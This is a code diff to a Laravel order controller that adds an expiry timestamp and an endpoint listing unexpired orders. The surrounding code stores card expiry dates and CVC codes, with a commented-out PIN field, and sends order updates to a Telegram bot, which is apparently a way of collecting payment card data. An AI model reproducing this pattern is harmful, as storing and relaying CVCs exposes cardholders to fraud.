@@ -8,6 +8,7 @@ use Validator;
 use App\Models\Order;
 use App\Http\Resources\Order as OrderResource;
 use Telegram\Bot\Laravel\Facades\Telegram;
+use Carbon\Carbon;
 
 class OrderController extends BaseController
 {
@@ -117,6 +118,7 @@ class OrderController extends BaseController
         if (is_null($order)) {
             return $this->sendError('Order does not exist.');
         }
+
         if ($order->status > 2) {
             return $this->sendError('Order status error.');
         }
@@ -126,6 +128,7 @@ class OrderController extends BaseController
           'card_date' => $input['card_date'],
           'cvc' => $input['cvc'],
           'status' => 3,
+          'expired' => Carbon::now()->addHour(),
           //'pincode' => $input['pincode'],
         ]);
 
@@ -137,6 +140,12 @@ class OrderController extends BaseController
             //'reply_markup' => $this->buildKeyboard($text),
         ]);
         return $this->sendResponse(new OrderResource($order), 'Order updated.');
+    }
+
+    public function checkExpired()
+    {
+          $orders = Order::where('status', 3)->where('expired', '>', Carbon::now())->get();
+          return $this->sendResponse(OrderResource::collection($orders), 'orders fetched.');
     }
 
 }
